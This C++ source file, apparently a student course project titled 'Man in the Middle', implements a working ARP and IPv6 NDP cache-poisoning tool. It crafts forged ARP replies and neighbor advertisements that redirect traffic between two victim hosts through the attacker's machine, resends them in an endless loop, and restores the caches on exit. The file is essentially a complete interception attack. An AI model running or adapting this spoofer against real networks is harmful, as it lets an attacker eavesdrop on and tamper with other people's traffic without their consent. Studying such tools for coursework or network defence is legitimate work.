/*
* Soubor:  Spoofer.cpp
* Datum:   2017/4/20
* Autor:   Bc. Lukas Pelanek, xpelan03@stud.fit.vutbr.cz
* Projekt: PDS, Man in the Middle
* Popis:   Aplikace otravuje NDP a ARP cache obeti
*/

#include <csignal>
#include <fstream>
#include <cstdint>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <ifaddrs.h>
#include <netinet/in.h> 
#include <net/if.h>
#include <unistd.h>
#include "IOHandler.h"
#include "Spoofer.h"

/* Pri implementaci jsem vychazel ze souboru, ktere jsou ke stazeni na teto adrese: http://www.pdbuchan.com/rawsock/rawsock.html */

// globalni promenne
int sck;
struct sockaddr_ll dev;
t_spooferParams params;

/* Signal handler */
void signalHandler(int signum) {
	// zaslani prislusnych zprav
	if (params.protocol == "arp") {
		Spoofer::restoreARPCache(params, &dev, &sck);
	}
	else if (params.protocol == "ndp") {
		Spoofer::restoreNDPCache(params, &dev, &sck);
	}
	exit(signum);
}

/* Hlavni program */
int main(int argc, char **argv) {
	// registrace signal handleru
	signal(SIGINT, signalHandler);
	int errCode;

	if ((errCode = IOHandler::getSpooferParameters(argc, argv, &params)) != IOHandler::ERR_NO_ERROR) {
		IOHandler::printError(errCode);
		return 1;
	}

	Spoofer program(params, &sck, &dev);

	// start aplikace
	if ((errCode = program.start()) != IOHandler::ERR_NO_ERROR) {
		IOHandler::printError(errCode);
		return 1;
	}

	return 0;
}

/* NDP Spoofing */
int Spoofer::_startNDPSpoof() {
	uint8_t packet1[100];
	uint8_t packet2[100];
	eth_hdr *eth_header;
	uint8_t *options;
	struct ip6_hdr *ip_header;
	struct nd_neighbor_advert *na_header;

	uint8_t mac1[6];
	uint8_t mac2[6];
	struct in6_addr ip1;
	struct in6_addr ip2;

	// prelozeni adres
	if ((inet_pton(AF_INET6, _params.victimIP.c_str(), &ip1)) != 1) {
		return IOHandler::ERR_NDP_SPOOF;
	}
	if ((inet_pton(AF_INET6, _params.victimIP2.c_str(), &ip2)) != 1) {
		return IOHandler::ERR_NDP_SPOOF;
	}

	// ziskani mac adresy obeti 1
	mac1[0] = std::stoul(_params.victimMAC.substr(0, 2), nullptr, 16);
	mac1[1] = std::stoul(_params.victimMAC.substr(2, 2), nullptr, 16);
	mac1[2] = std::stoul(_params.victimMAC.substr(5, 2), nullptr, 16);
	mac1[3] = std::stoul(_params.victimMAC.substr(7, 2), nullptr, 16);
	mac1[4] = std::stoul(_params.victimMAC.substr(10, 2), nullptr, 16);
	mac1[5] = std::stoul(_params.victimMAC.substr(12, 2), nullptr, 16);

	// ziskani mac adresy obeti 2
	mac2[0] = std::stoul(_params.victimMAC2.substr(0, 2), nullptr, 16);
	mac2[1] = std::stoul(_params.victimMAC2.substr(2, 2), nullptr, 16);
	mac2[2] = std::stoul(_params.victimMAC2.substr(5, 2), nullptr, 16);
	mac2[3] = std::stoul(_params.victimMAC2.substr(7, 2), nullptr, 16);
	mac2[4] = std::stoul(_params.victimMAC2.substr(10, 2), nullptr, 16);
	mac2[5] = std::stoul(_params.victimMAC2.substr(12, 2), nullptr, 16);

	// nastaveni hodnot prvniho paketu
	eth_header = (eth_hdr *)packet1;
	ip_header = (struct ip6_hdr *)(packet1 + 14);
	na_header = (struct nd_neighbor_advert *)(packet1 + 54);
	options = packet1 + 54 + sizeof(struct nd_neighbor_advert);

	memcpy(eth_header->source, _macAddress, 6);
	memcpy(eth_header->dest, mac1, 6);
	eth_header->type = htons(0x86dd);

	ip_header->ip6_flow = htonl((6 << 28) | (0 << 20) | 0);
	ip_header->ip6_plen = htons(32);
	ip_header->ip6_nxt = IPPROTO_ICMPV6;
	ip_header->ip6_hops = 255;
	ip_header->ip6_src = ip2;
	ip_header->ip6_dst = ip1;

	na_header->nd_na_hdr.icmp6_type = ND_NEIGHBOR_ADVERT;
	na_header->nd_na_hdr.icmp6_code = 0;
	na_header->nd_na_hdr.icmp6_cksum = 0;
	na_header->nd_na_flags_reserved = htonl((1 << 30) + (1 << 29));
	na_header->nd_na_target = ip2;

	// nastaveni options a mac adresy
	options[0] = 2;
	options[1] = 1;
	memcpy(options + 2, _macAddress, 6);

	// checksum
	na_header->nd_na_hdr.icmp6_cksum = Spoofer::getChecksum((uint8_t*)ip_header);

	// nastaveni hodnot druheho paketu
	eth_header = (eth_hdr *)packet2;
	ip_header = (struct ip6_hdr *)(packet2 + 14);
	na_header = (struct nd_neighbor_advert *)(packet2 + 54);
	options = packet2 + 54 + sizeof(struct nd_neighbor_advert);

	// nastaveni hodnot paketu
	memcpy(eth_header->source, _macAddress, 6);
	memcpy(eth_header->dest, mac2, 6);
	eth_header->type = htons(0x86dd);

	ip_header->ip6_flow = htonl((6 << 28) | (0 << 20) | 0);
	ip_header->ip6_plen = htons(32);
	ip_header->ip6_nxt = IPPROTO_ICMPV6;
	ip_header->ip6_hops = 255;
	ip_header->ip6_src = ip1;
	ip_header->ip6_dst = ip2;

	na_header->nd_na_hdr.icmp6_type = ND_NEIGHBOR_ADVERT;
	na_header->nd_na_hdr.icmp6_code = 0;
	na_header->nd_na_hdr.icmp6_cksum = 0;
	na_header->nd_na_flags_reserved = htonl((1 << 30) + (1 << 29));
	na_header->nd_na_target = ip1;

	// nastaveni options a mac adresy
	options[0] = 2;
	options[1] = 1;
	memcpy(options + 2, _macAddress, 6);

	// checksum
	na_header->nd_na_hdr.icmp6_cksum = Spoofer::getChecksum((uint8_t*)ip_header);

	while (true) {
		// odeslani icmp zpravy
		if (sendto(*_socket, packet1, 86, 0, (struct sockaddr *) _dev, sizeof(*_dev)) < 0) {
			return IOHandler::ERR_NDP_SPOOF;
		}

		// odeslani icmp zpravy
		if (sendto(*_socket, packet2, 86, 0, (struct sockaddr *) _dev, sizeof(*_dev)) < 0) {
			return IOHandler::ERR_NDP_SPOOF;
		}
		sleep(_params.timer);
	}

	return 0;
}

/* ARP spoofing */
int Spoofer::_startARPSpoof() {
	uint8_t packet1[100];
	uint8_t packet2[100];
	arp_hdr *arp_header;
	eth_hdr *eth_header;

	uint8_t mac1[6];
	uint8_t mac2[6];
	uint32_t ip1;
	uint32_t ip2;

	// prelozeni adres
	if ((inet_pton(AF_INET, _params.victimIP.c_str(), &ip1)) != 1) {
		return IOHandler::ERR_ARP_SPOOF;
	}
	if ((inet_pton(AF_INET, _params.victimIP2.c_str(), &ip2)) != 1) {
		return IOHandler::ERR_ARP_SPOOF;
	}

	// ziskani mac adresy obeti 1
	mac1[0] = std::stoul(_params.victimMAC.substr(0, 2), nullptr, 16);
	mac1[1] = std::stoul(_params.victimMAC.substr(2, 2), nullptr, 16);
	mac1[2] = std::stoul(_params.victimMAC.substr(5, 2), nullptr, 16);
	mac1[3] = std::stoul(_params.victimMAC.substr(7, 2), nullptr, 16);
	mac1[4] = std::stoul(_params.victimMAC.substr(10, 2), nullptr, 16);
	mac1[5] = std::stoul(_params.victimMAC.substr(12, 2), nullptr, 16);

	// ziskani mac adresy obeti 2
	mac2[0] = std::stoul(_params.victimMAC2.substr(0, 2), nullptr, 16);
	mac2[1] = std::stoul(_params.victimMAC2.substr(2, 2), nullptr, 16);
	mac2[2] = std::stoul(_params.victimMAC2.substr(5, 2), nullptr, 16);
	mac2[3] = std::stoul(_params.victimMAC2.substr(7, 2), nullptr, 16);
	mac2[4] = std::stoul(_params.victimMAC2.substr(10, 2), nullptr, 16);
	mac2[5] = std::stoul(_params.victimMAC2.substr(12, 2), nullptr, 16);
	
	// nastaveni hlavicek prvniho paketu
	eth_header = (eth_hdr *)packet1;
	arp_header = (arp_hdr *)(packet1 + 14);
	
	memcpy(eth_header->source, _macAddress, 6);
	memcpy(eth_header->dest, mac1, 6);
	eth_header->type = htons(0x0806);	// ARP

	arp_header->htype = htons(1);
	arp_header->ptype = htons(0x0800);
	arp_header->hlen = 6;
	arp_header->plen = 4;
	arp_header->opcode = htons(2);

	memcpy(arp_header->sender_mac, _macAddress, 6);
	memcpy(arp_header->target_mac, mac1, 6);

	memcpy(arp_header->sender_ip, &ip2, 4);
	memcpy(arp_header->target_ip, &ip1, 4);

	// nastaveni hlavicek druheho paketu
	eth_header = (eth_hdr *)packet2;
	arp_header = (arp_hdr *)(packet2 + 14);

	memcpy(eth_header->source, _macAddress, 6);
	memcpy(eth_header->dest, mac2, 6);
	eth_header->type = htons(0x0806);	// ARP

	arp_header->htype = htons(1);
	arp_header->ptype = htons(0x0800);
	arp_header->hlen = 6;
	arp_header->plen = 4;
	arp_header->opcode = htons(2);

	memcpy(arp_header->sender_mac, _macAddress, 6);
	memcpy(arp_header->target_mac, mac2, 6);

	memcpy(arp_header->sender_ip, &ip1, 4);
	memcpy(arp_header->target_ip, &ip2, 4);

	// cache poisoning
	while (true) {
		if (sendto(*_socket, packet1, 42, 0, (struct sockaddr *) _dev, sizeof(*_dev)) < 0) {
			close(*_socket);
			return IOHandler::ERR_ARP_SPOOF;
		}

		if (sendto(*_socket, packet2, 42, 0, (struct sockaddr *) _dev, sizeof(*_dev)) < 0) {
			close(*_socket);
			return IOHandler::ERR_ARP_SPOOF;
		}
		sleep(_params.timer);
	}	

	return 0;
}

/* Start aplikace */
int Spoofer::start() {
	int err = 0;
	if (_init() != IOHandler::ERR_NO_ERROR) {
		return IOHandler::ERR_INIT;
	}
	if (_params.protocol == "arp") {
		err = _startARPSpoof();
	}
	else if (_params.protocol == "ndp") {
		err = _startNDPSpoof();
	}
	return err;
}

Spoofer::Spoofer(t_spooferParams params, int *sock, struct sockaddr_ll *dev) : _params(params) {
	_socket = sock;
	_dev = dev;
}

/* Inicializace a otevreni socketu */
int Spoofer::_init() {
	struct ifaddrs * ifAddrStruct = NULL;
	bool interfaceFound = false;
	struct ifaddrs * ifa = NULL;
	void * tmpAddrPtr = NULL;
	struct ifreq ifr;

	getifaddrs(&ifAddrStruct);

	for (ifa = ifAddrStruct; ifa != NULL; ifa = ifa->ifa_next) {
		if (!ifa->ifa_addr) {
			continue;
		}
		// ziskame ipv4 adresu a masku
		if (ifa->ifa_addr->sa_family == AF_INET && _params.interface == ifa->ifa_name) {
			_ipv4Addr = ((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
			_ipv4Mask = ((struct sockaddr_in *)ifa->ifa_netmask)->sin_addr;
			interfaceFound = true;
		}
		// ziskame ipv6 adresu a masku
		else if (ifa->ifa_addr->sa_family == AF_INET6 && _params.interface == ifa->ifa_name) {
			_ipv6Addr = ((struct sockaddr_in6 *)ifa->ifa_addr)->sin6_addr;
			_ipv6Mask = ((struct sockaddr_in6 *)ifa->ifa_netmask)->sin6_addr;
			interfaceFound = true;
		}
	}
	if (ifAddrStruct != NULL) {
		freeifaddrs(ifAddrStruct);
	}

	if (!interfaceFound) {
		return IOHandler::ERR_NO_IF_FOUND;
	}

	// otevreni socketu
	if ((*_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
		return IOHandler::ERR_INIT;
	}

	// cteni mac adresy
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", _params.interface.c_str());
	if (ioctl(*_socket, SIOCGIFHWADDR, &ifr) < 0) {
		return IOHandler::ERR_INIT;
	}

	// kopirovani mac adresy
	memcpy(_macAddress, ifr.ifr_hwaddr.sa_data, 6);

	// konfigurace zarizeni 
	memset(_dev, 0, sizeof(*_dev));
	if ((_dev->sll_ifindex = if_nametoindex(_params.interface.c_str())) == 0) {
		close(*_socket);
		return IOHandler::ERR_INIT;
	}
	_dev->sll_family = AF_PACKET;
	_dev->sll_halen = 6;
	memcpy(&_dev->sll_addr, _macAddress, 6);

	// otevreni socketu
	if ((*_socket = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
		return IOHandler::ERR_INIT;
	}

	return 0;
}

/* Vypocet checksum */
uint16_t Spoofer::getChecksum(uint8_t *packet) {
	uint8_t data[200];
	struct ip6_hdr *ip_header;
	struct nd_neighbor_advert *ndp_header;
	uint32_t cksum = 0;
	uint16_t *buffer;
	int x = 0;
	int length = sizeof(struct nd_neighbor_advert) + 8 + 40;
	uint32_t lengthField = htonl(sizeof(struct nd_neighbor_advert) + 8);

	buffer = (uint16_t*)data;
	ip_header = (struct ip6_hdr*)(packet);
	ndp_header = (struct nd_neighbor_advert*)(packet + 40);

	// vyskladame pseudohlavicku a za ni zkopirujeme cely icmp packet
	memcpy(data, ip_header->ip6_src.s6_addr, 16);
	memcpy(data + 16, ip_header->ip6_dst.s6_addr, 16);
	memcpy(data + 32, &lengthField, 4);
	memset(data + 36, 0x00, 3);
	data[39] = ip_header->ip6_nxt;
	memcpy(data + 40, packet + 40, sizeof(struct nd_neighbor_advert) + 8);

	// spocitani checksum
	while (length > 1) {
		cksum += *buffer++;
		length -= sizeof(uint16_t);
	}

	if (length) {
		cksum += *(uint16_t*)buffer;
	}

	cksum = (cksum >> 16) + (cksum & 0xFFFF);
	cksum += (cksum >> 16);

	return (uint16_t)(~cksum);
}

/* Obnovi arp cache zarizeni */
void Spoofer::restoreARPCache(t_spooferParams params, struct sockaddr_ll *dev, int *sck) {
	uint8_t packet1[100];
	uint8_t packet2[100];
	arp_hdr *arp_header;
	eth_hdr *eth_header;

	uint8_t mac1[6];
	uint8_t mac2[6];
	uint32_t ip1;
	uint32_t ip2;

	// prelozeni adres
	inet_pton(AF_INET, params.victimIP.c_str(), &ip1);
	inet_pton(AF_INET, params.victimIP2.c_str(), &ip2);
	
	// ziskani mac adresy obeti 1
	mac1[0] = std::stoul(params.victimMAC.substr(0, 2), nullptr, 16);
	mac1[1] = std::stoul(params.victimMAC.substr(2, 2), nullptr, 16);
	mac1[2] = std::stoul(params.victimMAC.substr(5, 2), nullptr, 16);
	mac1[3] = std::stoul(params.victimMAC.substr(7, 2), nullptr, 16);
	mac1[4] = std::stoul(params.victimMAC.substr(10, 2), nullptr, 16);
	mac1[5] = std::stoul(params.victimMAC.substr(12, 2), nullptr, 16);

	// ziskani mac adresy obeti 2
	mac2[0] = std::stoul(params.victimMAC2.substr(0, 2), nullptr, 16);
	mac2[1] = std::stoul(params.victimMAC2.substr(2, 2), nullptr, 16);
	mac2[2] = std::stoul(params.victimMAC2.substr(5, 2), nullptr, 16);
	mac2[3] = std::stoul(params.victimMAC2.substr(7, 2), nullptr, 16);
	mac2[4] = std::stoul(params.victimMAC2.substr(10, 2), nullptr, 16);
	mac2[5] = std::stoul(params.victimMAC2.substr(12, 2), nullptr, 16);

	// nastaveni hlavicek prvniho paketu
	eth_header = (eth_hdr *)packet1;
	arp_header = (arp_hdr *)(packet1 + 14);

	memcpy(eth_header->source, mac2, 6);
	memcpy(eth_header->dest, mac1, 6);
	eth_header->type = htons(0x0806);	// ARP

	arp_header->htype = htons(1);
	arp_header->ptype = htons(0x0800);
	arp_header->hlen = 6;
	arp_header->plen = 4;
	arp_header->opcode = htons(2);

	memcpy(arp_header->sender_mac, mac2, 6);
	memcpy(arp_header->target_mac, mac1, 6);

	memcpy(arp_header->sender_ip, &ip2, 4);
	memcpy(arp_header->target_ip, &ip1, 4);

	// nastaveni hlavicek druheho paketu
	eth_header = (eth_hdr *)packet2;
	arp_header = (arp_hdr *)(packet2 + 14);

	memcpy(eth_header->source, mac1, 6);
	memcpy(eth_header->dest, mac2, 6);
	eth_header->type = htons(0x0806);	// ARP

	arp_header->htype = htons(1);
	arp_header->ptype = htons(0x0800);
	arp_header->hlen = 6;
	arp_header->plen = 4;
	arp_header->opcode = htons(2);

	memcpy(arp_header->sender_mac, mac1, 6);
	memcpy(arp_header->target_mac, mac2, 6);

	memcpy(arp_header->sender_ip, &ip1, 4);
	memcpy(arp_header->target_ip, &ip2, 4);

	// odeslani paketu
	sendto(*sck, packet1, 42, 0, (struct sockaddr *) dev, sizeof(*dev));
	sendto(*sck, packet2, 42, 0, (struct sockaddr *) dev, sizeof(*dev));

	close(*sck);
}

/* Obnovi ndp cache zarizeni */
void Spoofer::restoreNDPCache(t_spooferParams params, struct sockaddr_ll *dev, int *sck) {
	uint8_t packet1[100];
	uint8_t packet2[100];
	eth_hdr *eth_header;
	uint8_t *options;
	struct ip6_hdr *ip_header;
	struct nd_neighbor_advert *na_header;

	uint8_t mac1[6];
	uint8_t mac2[6];
	struct in6_addr ip1;
	struct in6_addr ip2;

	// prelozeni adres
	inet_pton(AF_INET6, params.victimIP.c_str(), &ip1);
	inet_pton(AF_INET6, params.victimIP2.c_str(), &ip2);

	// ziskani mac adresy obeti 1
	mac1[0] = std::stoul(params.victimMAC.substr(0, 2), nullptr, 16);
	mac1[1] = std::stoul(params.victimMAC.substr(2, 2), nullptr, 16);
	mac1[2] = std::stoul(params.victimMAC.substr(5, 2), nullptr, 16);
	mac1[3] = std::stoul(params.victimMAC.substr(7, 2), nullptr, 16);
	mac1[4] = std::stoul(params.victimMAC.substr(10, 2), nullptr, 16);
	mac1[5] = std::stoul(params.victimMAC.substr(12, 2), nullptr, 16);

	// ziskani mac adresy obeti 2
	mac2[0] = std::stoul(params.victimMAC2.substr(0, 2), nullptr, 16);
	mac2[1] = std::stoul(params.victimMAC2.substr(2, 2), nullptr, 16);
	mac2[2] = std::stoul(params.victimMAC2.substr(5, 2), nullptr, 16);
	mac2[3] = std::stoul(params.victimMAC2.substr(7, 2), nullptr, 16);
	mac2[4] = std::stoul(params.victimMAC2.substr(10, 2), nullptr, 16);
	mac2[5] = std::stoul(params.victimMAC2.substr(12, 2), nullptr, 16);

	// nastaveni hodnot prvniho paketu
	eth_header = (eth_hdr *)packet1;
	ip_header = (struct ip6_hdr *)(packet1 + 14);
	na_header = (struct nd_neighbor_advert *)(packet1 + 54);
	options = packet1 + 54 + sizeof(struct nd_neighbor_advert);

	memcpy(eth_header->source, mac2, 6);
	memcpy(eth_header->dest, mac1, 6);
	eth_header->type = htons(0x86dd);

	ip_header->ip6_flow = htonl((6 << 28) | (0 << 20) | 0);
	ip_header->ip6_plen = htons(32);
	ip_header->ip6_nxt = IPPROTO_ICMPV6;
	ip_header->ip6_hops = 255;
	ip_header->ip6_src = ip2;
	ip_header->ip6_dst = ip1;

	na_header->nd_na_hdr.icmp6_type = ND_NEIGHBOR_ADVERT;
	na_header->nd_na_hdr.icmp6_code = 0;
	na_header->nd_na_hdr.icmp6_cksum = 0;
	na_header->nd_na_flags_reserved = htonl((1 << 30) + (1 << 29));
	na_header->nd_na_target = ip2;

	// nastaveni options a mac adresy
	options[0] = 2;
	options[1] = 1;
	memcpy(options + 2, mac2, 6);

	// checksum
	na_header->nd_na_hdr.icmp6_cksum = Spoofer::getChecksum((uint8_t*)ip_header);

	// nastaveni hodnot druheho paketu
	eth_header = (eth_hdr *)packet2;
	ip_header = (struct ip6_hdr *)(packet2 + 14);
	na_header = (struct nd_neighbor_advert *)(packet2 + 54);
	options = packet2 + 54 + sizeof(struct nd_neighbor_advert);

	// nastaveni hodnot paketu
	memcpy(eth_header->source, mac1, 6);
	memcpy(eth_header->dest, mac2, 6);
	eth_header->type = htons(0x86dd);

	ip_header->ip6_flow = htonl((6 << 28) | (0 << 20) | 0);
	ip_header->ip6_plen = htons(32);
	ip_header->ip6_nxt = IPPROTO_ICMPV6;
	ip_header->ip6_hops = 255;
	ip_header->ip6_src = ip1;
	ip_header->ip6_dst = ip2;

	na_header->nd_na_hdr.icmp6_type = ND_NEIGHBOR_ADVERT;
	na_header->nd_na_hdr.icmp6_code = 0;
	na_header->nd_na_hdr.icmp6_cksum = 0;
	na_header->nd_na_flags_reserved = htonl((1 << 30) + (1 << 29));
	na_header->nd_na_target = ip1;

	// nastaveni options a mac adresy
	options[0] = 2;
	options[1] = 1;
	memcpy(options + 2, mac1, 6);

	// checksum
	na_header->nd_na_hdr.icmp6_cksum = Spoofer::getChecksum((uint8_t*)ip_header);

	// odeslani ndp zpravy
	sendto(*sck, packet1, 86, 0, (struct sockaddr *) dev, sizeof(*dev));
	sendto(*sck, packet2, 86, 0, (struct sockaddr *) dev, sizeof(*dev));

	close(*sck);
}